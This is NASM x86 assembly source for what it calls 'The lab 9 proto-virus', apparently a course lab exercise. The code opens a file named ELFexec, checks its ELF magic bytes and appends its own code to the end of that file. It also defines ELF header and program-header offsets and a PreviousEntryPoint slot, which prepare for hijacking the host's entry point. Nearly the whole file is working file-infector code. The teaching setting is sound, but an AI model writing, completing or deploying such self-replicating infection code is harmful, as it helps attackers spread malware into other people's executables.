%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define FD dword [ebp-4]
%define ELF_header ebp-56

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	call get_my_loc
    mov ebx, FileName           ; Set filename
    open ebx,RDWR, 0x777
    mov FD, eax					;save the file descriptor
    cmp FD, -1
    je FD_Error

    lea ecx, [ELF_header]
    read FD,ecx,52			;read 52 first byte (header size of ELF)

    cmp dword [ELF_header], 0x464C457F ; compare the first 4 bytes of the file to check if is ELF
    jne Not_Elf

	write 1, OutStr, 32					; print virus

    lseek FD, 0 ,SEEK_END 				;set the file pointer to the end of the file

    call get_my_loc
    mov ecx, _start
    mov edx , virus_end-_start
    write FD,ecx,edx					;write the content of this script to the end of the file
    call VirusExit
	

Not_Elf:
    close FD
    write 1, Failstr, 11
    exit 0


FD_Error:
		exit -1


VirusExit:
       close FD
       exit 0               ; Termination if all is OK and no previous code to jump to
                            ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


